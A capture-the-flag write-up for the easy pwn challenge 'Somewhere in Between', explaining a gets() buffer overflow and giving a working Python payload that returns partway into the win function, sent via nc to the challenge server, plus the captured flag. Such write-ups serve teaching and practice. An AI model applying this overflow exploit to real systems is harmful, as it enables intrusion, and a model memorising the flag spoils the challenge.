# Somewhere in Between
# Pwn(Easy)
I started by checking the binary and looking for useful functions and strings:

```bash
file b3twin
strings b3twin
nm -n b3twin
```

The binary contained `cat flag.txt` and a function called `win` at `0x401176`. I disassembled `main` and `win` to see how they worked:

```bash
objdump -d -M intel b3twin | sed -n '/<main>:/,/^$/p'
objdump -d -M intel b3twin | sed -n '/<win>:/,/^$/p'
```

In `main`, I found that user input was read with `gets()`. Since `gets()` does not limit how much input it reads, I could overflow the buffer. The buffer was 80 bytes, so the saved return address was 88 bytes from the start of my input.

The `win` function eventually runs `system("cat flag.txt")`, but starting at the beginning resets a variable that controls whether it reaches that command. Instead, I returned to `0x40119a`, partway through `win`, after that reset. I also put `BBBB` in the right spot to make the checked variable non-zero.

## Payload

This builds 76 bytes of padding, the non-zero value, 8 bytes for saved RBP, and the address to jump to:

```bash
python3 - <<'PY' > /tmp/payload
import struct
import sys

payload = b'A' * 76 + b'BBBB' + b'C' * 8
payload += struct.pack('<Q', 0x40119a)
sys.stdout.buffer.write(payload)
PY
```

I tested it locally with a temporary flag:

```bash
printf 'bi0s{local_test_flag}\n' > flag.txt
./b3twin < /tmp/payload
```

Then I sent the same payload to the remote service:

```bash
python3 - <<'PY' | nc 3.111.53.245 1339
import struct
import sys

payload = b'A' * 76 + b'BBBB' + b'C' * 8
payload += struct.pack('<Q', 0x40119a)
sys.stdout.buffer.write(payload)
PY
```

The trick was to return to the useful part of `win` instead of its beginning—somewhere in between.

**Flag:** `bi0s{s0m3t1mes_y0u_g0tta_l00k_b3twin_th3_l1n35}`